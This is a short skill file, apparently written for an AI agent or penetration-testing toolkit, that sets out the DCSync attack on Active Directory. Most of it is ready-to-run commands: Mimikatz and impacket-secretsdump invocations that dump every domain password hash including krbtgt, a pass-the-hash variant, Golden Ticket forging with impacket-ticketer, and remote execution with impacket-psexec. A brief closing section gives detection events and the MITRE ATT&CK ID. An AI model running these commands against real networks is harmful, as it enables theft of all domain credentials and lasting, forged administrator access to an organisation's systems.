---
name: dcsync
description: DCSync attack methodology — replicate AD credentials from Domain Controllers without touching LSASS. Covers privilege requirements, execution, and credential extraction for all domain accounts including krbtgt.
version: 1.0.0
license: Apache-2.0
---

# DCSync

## Overview

DCSync abuses the Directory Replication Service (DRS) protocol to request password hashes from a Domain Controller as if the attacker's machine were another DC. No code runs on the DC; no LSASS dump needed.

**Required permissions (any one of):**
- Domain Admin / Enterprise Admin
- Replicating Directory Changes + Replicating Directory Changes All (delegated)
- Account Operators (in some configurations)

## Execution

**Mimikatz:**
```
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv
```

**Impacket (Linux — remote):**
```bash
impacket-secretsdump domain/admin:password@dc-ip -just-dc
impacket-secretsdump domain/admin:password@dc-ip -just-dc-ntlm
impacket-secretsdump domain/admin:password@dc-ip -just-dc-user krbtgt
```

**With hash (no plaintext):**
```bash
impacket-secretsdump -hashes :NTLM_HASH domain/admin@dc-ip -just-dc
```

## High-Value Targets

```
krbtgt       → Golden Ticket creation (10-year TGT forgery)
Administrator → Direct domain admin access
MACHINE$     → Silver Ticket / Kerberos service attacks
```

## Post-DCSync — Golden Ticket

```bash
# Generate Golden Ticket with krbtgt hash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain/administrator@dc-ip
```

## Detection Notes (for blue team context in report)

- DRS replication calls from non-DC hosts are highly anomalous
- Windows Event ID 4662 with Object Type = "domainDNS" and Access Mask including "Replicating Directory Changes"
- NetFlow anomalies on port 135/TCP (RPC endpoint mapping) from workstations to DC

## MITRE ATT&CK

- T1003.006 — OS Credential Dumping: DCSync
